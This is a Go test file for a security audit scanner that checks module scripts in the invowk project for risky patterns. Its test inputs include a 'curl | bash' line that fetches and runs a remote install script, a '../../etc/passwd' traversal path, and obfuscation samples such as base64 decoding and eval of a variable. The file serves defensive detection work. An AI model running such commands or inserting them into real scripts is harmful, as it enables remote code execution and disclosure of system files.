// SPDX-License-Identifier: MPL-2.0

package audit

import (
	"testing"

	"github.com/invowk/invowk/pkg/invowkfile"
	"github.com/invowk/invowk/pkg/types"
)

func TestScriptChecker_RemoteExecution(t *testing.T) {
	t.Parallel()

	sc := newSingleScriptContext("curl -sSL https://example.com/install.sh | bash")
	checker := NewScriptChecker()
	findings, err := checker.Check(t.Context(), sc)
	if err != nil {
		t.Fatal(err)
	}

	hasCritical := false
	for _, f := range findings {
		if f.Severity == SeverityCritical && f.Title == "Script downloads and executes remote code" {
			hasCritical = true
		}
	}
	if !hasCritical {
		t.Error("expected Critical finding for curl|bash pattern")
	}
}

func TestScriptChecker_PathTraversal(t *testing.T) {
	t.Parallel()

	mod := &ScannedModule{
		Path:      types.FilesystemPath("/test/mod.invowkmod"),
		SurfaceID: "testmod",
		Invowkfile: &invowkfile.Invowkfile{
			Commands: []invowkfile.Command{{
				Name: "bad",
				Implementations: []invowkfile.Implementation{{
					Script:   invowkfile.ScriptContent("../../etc/passwd"),
					Runtimes: []invowkfile.RuntimeConfig{{Name: invowkfile.RuntimeVirtual}},
				}},
			}},
		},
	}
	sc := newModuleOnlyContext(mod)

	checker := NewScriptChecker()
	findings, err := checker.Check(t.Context(), sc)
	if err != nil {
		t.Fatal(err)
	}

	hasTraversal := false
	for _, f := range findings {
		if f.Category == CategoryPathTraversal && f.SurfaceID == "SC-01" {
			hasTraversal = true
		}
	}
	if !hasTraversal {
		t.Error("expected path traversal finding for ../etc/passwd")
	}
}

func TestScriptChecker_AbsolutePathInModule(t *testing.T) {
	t.Parallel()

	mod := &ScannedModule{
		Path:      types.FilesystemPath("/test/mod.invowkmod"),
		SurfaceID: "testmod",
		Invowkfile: &invowkfile.Invowkfile{
			Commands: []invowkfile.Command{{
				Name: "bad",
				Implementations: []invowkfile.Implementation{{
					Script:   invowkfile.ScriptContent("/usr/local/bin/script.sh"),
					Runtimes: []invowkfile.RuntimeConfig{{Name: invowkfile.RuntimeNative}},
				}},
			}},
		},
	}
	sc := newModuleOnlyContext(mod)

	checker := NewScriptChecker()
	findings, err := checker.Check(t.Context(), sc)
	if err != nil {
		t.Fatal(err)
	}

	hasAbsPath := false
	for _, f := range findings {
		if f.Title == "Module script uses absolute path" {
			hasAbsPath = true
		}
	}
	if !hasAbsPath {
		t.Error("expected absolute path finding in module context")
	}
}

func TestScriptChecker_Obfuscation(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		script  string
		wantHit bool
	}{
		{"base64_decode", "echo data | base64 -d", true},
		{"eval_var", `eval "$CMD"`, true},
		{"base64_subshell", "$(echo test | base64)", true},
		{"hex_sequences", `printf '\x48\x65\x6c\x6c\x6f'`, true},
		{"clean_script", "echo hello world", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			sc := newSingleScriptContext(tt.script)
			checker := NewScriptChecker()
			findings, err := checker.Check(t.Context(), sc)
			if err != nil {
				t.Fatal(err)
			}

			hasObfuscation := false
			for _, f := range findings {
				if f.Category == CategoryObfuscation {
					hasObfuscation = true
				}
			}
			if hasObfuscation != tt.wantHit {
				t.Errorf("obfuscation detected = %v, want %v", hasObfuscation, tt.wantHit)
			}
		})
	}
}

func TestScriptChecker_CleanScript(t *testing.T) {
	t.Parallel()

	sc := newSingleScriptContext("echo building && go build ./...")
	checker := NewScriptChecker()
	findings, err := checker.Check(t.Context(), sc)
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 0 {
		t.Errorf("clean script produced %d findings, want 0", len(findings))
	}
}
